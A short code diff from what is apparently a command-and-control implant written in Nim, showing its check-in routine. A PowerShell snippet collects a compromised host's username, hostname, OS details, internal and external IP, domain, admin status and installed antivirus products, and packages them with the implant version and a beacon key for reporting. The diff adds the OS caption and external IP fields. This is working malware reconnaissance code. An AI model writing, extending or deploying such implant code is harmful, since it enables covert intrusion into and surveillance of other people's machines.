@@ -8,6 +8,7 @@ proc checkin_command*(id :string): JsonNode =
     let info_command = """$info = @{
     user = $env:USERNAME
     hostname = $env:COMPUTERNAME
+    os = (Get-CimInstance Win32_OperatingSystem).Caption
     os_version = (Get-ComputerInfo).WindowsVersion
     os_build = (Get-ComputerInfo).OsBuildNumber
     architecture = $env:PROCESSOR_ARCHITECTURE
@@ -30,12 +31,14 @@ proc checkin_command*(id :string): JsonNode =
       "id": id, #agent's id
       "user": checkin_json["user"].getStr(),
       "hostname": checkin_json["hostname"].getStr(), #name of the host in whcih the agent is residing
+      "os": checkin_json["os"].getStr(),
       "os_version": checkin_json["os_version"].getStr(),
       "os_build": checkin_json["os_build"].getStr(),
       "architecture": checkin_json["architecture"].getStr(),
       "process_id": checkin_json["process_id"].getStr(),
       "process_name": checkin_json["process_name"].getStr(),
       "internal_ip": checkin_json["internal_ip"].getStr(),
+      "external_ip": checkin_json["external_ip"].getStr(),
       "domain": checkin_json["domain"].getStr(),
       "is_admin": checkin_json["is_admin"].getStr(),
       "av_products": checkin_json["av_products"].getStr(),
@@ -44,7 +47,7 @@ proc checkin_command*(id :string): JsonNode =
       "implant_version": IMPLANT_VERSION,
       "beacon_key": PER_BEACON_KEY,
       "timestamp": utc(now()).format("yyyy-MM-dd'T'HH:mm:ss'Z'"), #like last seen or last activity
-      "status": "Active",
+      "status": "active",
     }
 
     return checkin_payload
